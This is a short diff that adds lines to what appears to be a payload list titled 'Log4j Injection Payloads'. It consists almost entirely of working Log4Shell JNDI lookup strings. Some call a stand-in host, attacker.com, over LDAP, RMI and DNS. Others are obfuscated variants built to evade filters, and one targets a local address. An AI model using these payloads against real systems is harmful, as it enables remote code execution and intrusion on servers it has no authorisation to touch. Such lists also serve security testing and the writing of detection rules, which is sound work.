@@ -1,2 +1,10 @@
--e # log4j Payload 46
+# Log4j Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}}
+${jndi:ldap://127.0.0.1/Exploit}
+${jndi:dns://attacker.com}
+${lower:jndi}
+${upper:jndi}
